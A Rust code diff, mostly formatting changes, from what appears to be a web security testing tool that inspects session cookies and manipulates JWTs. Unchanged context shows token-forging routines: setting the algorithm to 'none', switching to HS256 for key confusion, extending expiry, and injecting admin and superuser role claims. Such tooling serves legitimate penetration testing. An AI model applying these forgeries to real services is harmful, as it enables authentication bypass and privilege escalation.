@@ -135,26 +135,33 @@ impl Cookie {
     /// Check if this is a session cookie
     fn is_session_cookie(&self) -> bool {
         let session_names = [
-            "sessionid", "session_id", "sess", "jsessionid",
-            "phpsessid", "asp.net_sessionid", "aspsessionid"
+            "sessionid",
+            "session_id",
+            "sess",
+            "jsessionid",
+            "phpsessid",
+            "asp.net_sessionid",
+            "aspsessionid",
         ];
-        session_names.iter().any(|&name| self.name.to_lowercase().contains(name))
+        session_names
+            .iter()
+            .any(|&name| self.name.to_lowercase().contains(name))
     }
 
     /// Check if session ID appears weak
     fn is_weak_session_id(&self) -> bool {
         let value = &self.value;
-        
+
         // Too short
         if value.len() < 16 {
             return true;
         }
-        
+
         // Sequential or predictable
         if value.chars().all(|c| c.is_numeric()) {
             return true;
         }
-        
+
         // Low entropy
         self.calculate_entropy() < 50
     }
@@ -226,10 +233,8 @@ impl JwtToken {
             return Err(Error::Parse("Invalid JWT format".to_string()));
         }
 
-        let header = Self::decode_base64_json::<JwtHeader>(parts[0])
-            .ok();
-        let payload = Self::decode_base64_json::<JwtPayload>(parts[1])
-            .ok();
+        let header = Self::decode_base64_json::<JwtHeader>(parts[0]).ok();
+        let payload = Self::decode_base64_json::<JwtPayload>(parts[1]).ok();
 
         Ok(Self {
             token: token.to_string(),
@@ -242,13 +247,12 @@ impl JwtToken {
     /// Decode base64 JSON
     fn decode_base64_json<T: for<'de> Deserialize<'de>>(data: &str) -> Result<T> {
         use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
-        
+
         let decoded = URL_SAFE_NO_PAD
             .decode(data)
             .map_err(|e| Error::Parse(format!("Base64 decode failed: {}", e)))?;
-        
-        serde_json::from_slice(&decoded)
-            .map_err(|e| Error::JsonParse(e))
+
+        serde_json::from_slice(&decoded).map_err(|e| Error::JsonParse(e))
     }
 
     /// Check if token is expired
@@ -360,13 +364,12 @@ impl JwtToken {
         let mut header: serde_json::Value = serde_json::from_slice(
             &general_purpose::URL_SAFE_NO_PAD
                 .decode(parts[0])
-                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?
+                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?,
         )?;
 
         header["alg"] = serde_json::Value::String("none".to_string());
 
-        let new_header = general_purpose::URL_SAFE_NO_PAD
-            .encode(serde_json::to_vec(&header)?);
+        let new_header = general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);
 
         // Keep original payload, remove signature
         Ok(format!("{}.{}.", new_header, parts[1]))
@@ -382,14 +385,13 @@ impl JwtToken {
         let mut header: serde_json::Value = serde_json::from_slice(
             &general_purpose::URL_SAFE_NO_PAD
                 .decode(parts[0])
-                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?
+                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?,
         )?;
 
         // Change to HS256
         header["alg"] = serde_json::Value::String("HS256".to_string());
 
-        let new_header = general_purpose::URL_SAFE_NO_PAD
-            .encode(serde_json::to_vec(&header)?);
+        let new_header = general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);
 
         Ok(format!("{}.{}.SIGNATURE_PLACEHOLDER", new_header, parts[1]))
     }
@@ -404,15 +406,14 @@ impl JwtToken {
         let mut payload: serde_json::Value = serde_json::from_slice(
             &general_purpose::URL_SAFE_NO_PAD
                 .decode(parts[1])
-                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?
+                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?,
         )?;
 
         // Set expiration to far future
         let future_exp = chrono::Utc::now().timestamp() + (365 * 24 * 60 * 60); // +1 year
         payload["exp"] = serde_json::Value::Number(future_exp.into());
 
-        let new_payload = general_purpose::URL_SAFE_NO_PAD
-            .encode(serde_json::to_vec(&payload)?);
+        let new_payload = general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload)?);
 
         Ok(format!("{}.{}.SIGNATURE_MODIFIED", parts[0], new_payload))
     }
@@ -427,7 +428,7 @@ impl JwtToken {
         let mut payload: serde_json::Value = serde_json::from_slice(
             &general_purpose::URL_SAFE_NO_PAD
                 .decode(parts[1])
-                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?
+                .map_err(|e| Error::Parse(format!("Base64 decode error: {}", e)))?,
         )?;
 
         // Inject admin claims
@@ -438,8 +439,7 @@ impl JwtToken {
             serde_json::Value::String("superuser".to_string()),
         ]);
 
-        let new_payload = general_purpose::URL_SAFE_NO_PAD
-            .encode(serde_json::to_vec(&payload)?);
+        let new_payload = general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload)?);
 
         Ok(format!("{}.{}.SIGNATURE_MODIFIED", parts[0], new_payload))
     }
@@ -517,10 +517,10 @@ impl SessionManager {
     pub async fn store_cookie(&self, cookie: Cookie) {
         let mut store = self.cookie_store.write().await;
         let domain_cookies = store.entry(cookie.domain.clone()).or_insert_with(Vec::new);
-        
+
         // Remove existing cookie with same name
         domain_cookies.retain(|c| c.name != cookie.name);
-        
+
         // Add new cookie
         domain_cookies.push(cookie);
     }
@@ -528,7 +528,7 @@ impl SessionManager {
     /// Get cookies for a domain
     pub async fn get_cookies(&self, domain: &str) -> Vec<Cookie> {
         let store = self.cookie_store.read().await;
-        
+
         store
             .get(domain)
             .map(|cookies| {
@@ -758,7 +758,7 @@ mod tests {
     #[tokio::test]
     async fn test_session_manager() {
         let manager = SessionManager::new();
-        
+
         let cookie = Cookie::new("session", "token123", "example.com");
         manager.store_cookie(cookie).await;
 
@@ -770,12 +770,12 @@ mod tests {
     #[tokio::test]
     async fn test_jwt_storage() {
         let manager = SessionManager::new();
-        
+
         // Simple JWT for testing (this is a mock, not a valid signature)
         let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
-        
+
         assert!(manager.set_jwt("auth", token).await.is_ok());
-        
+
         let jwt = manager.get_jwt("auth").await;
         assert!(jwt.is_some());
     }
@@ -783,10 +783,10 @@ mod tests {
     #[tokio::test]
     async fn test_session_variables() {
         let manager = SessionManager::new();
-        
+
         manager.set_variable("user_id", "12345").await;
         let value = manager.get_variable("user_id").await;
-        
+
         assert_eq!(value, Some("12345".to_string()));
     }
 }
